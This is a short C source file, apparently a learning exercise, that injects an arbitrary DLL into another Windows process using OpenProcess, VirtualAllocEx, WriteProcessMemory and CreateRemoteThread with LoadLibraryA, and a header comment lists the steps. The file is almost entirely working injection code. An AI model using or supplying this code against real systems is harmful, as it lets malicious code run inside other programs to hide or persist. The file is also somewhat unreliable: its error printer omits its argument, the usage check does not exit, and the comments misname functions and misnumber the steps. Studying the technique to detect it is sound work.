/*	1. Identify target process and get PID.
*	2. Open a handle to tp with OpenProcess().
*	3. Allocate memory with VirtualAllocEx() with arguments:
*		1. handle to tp
*		2. number of bytes to be allocated for full pathname of malicious DLL
*		3. (0x4) constant value representation of PAGE_READWRITE.
*   Return value is address of allocated memory in tp.
*	4. Use WriteProcess() to copy DLL pathname into allocated memory.
*	5. Determine the address of LoadLibrary() in kernel32.dll.
*		1. Call GetModuleHandleA() with kernel32.dll as the arugment which will return base address.
*		2. Call GetProcessAddress() to find address of LoadLibrary().
*	5. Call LoadLibrary() from remote thread.
*	6. Call CreateRemoteThread() or NTCreateThreadEx() to  create thread in target process 
*/
#include <Windows.h>
#include <stdio.h>

int Error(const char* msg) {
	printf("%s (%u)\n", GetLastError());
	return 1;
}

//Grabbing pid from cmdline
int main(int argc, const char* argv[]) {
	if (argc < 3) {
		printf("Usage: remoteThread <pid> <dllpath>\n");
	}
	//Opening handle to process
	int pid = atoi(argv[1]);
	//arguments needed to ensure we can write to process memory (WriteProcess()), allocate memory for DLL path, and to create thread.
	HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD, FALSE, pid);
	if (!hProcess)
		return Error("Error opening process.");

	//Allocate memory in target process with a page (4kb) and immediately committing and reserving it.  Needs to have read/write perms 
	void* buffer = VirtualAllocEx(hProcess, nullptr, 1 << 12, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buffer)
		return Error("failed to allocate memory.");

	if (!WriteProcessMemory(hProcess, buffer, argv[2], strlen(argv[2]), nullptr))
	return Error("failed to write to memory.");

	HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
		(LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32"), "LoadLibraryA"),
		buffer, 0, nullptr);
	if (!hThread)
		return Error("failed to create thread.");
}
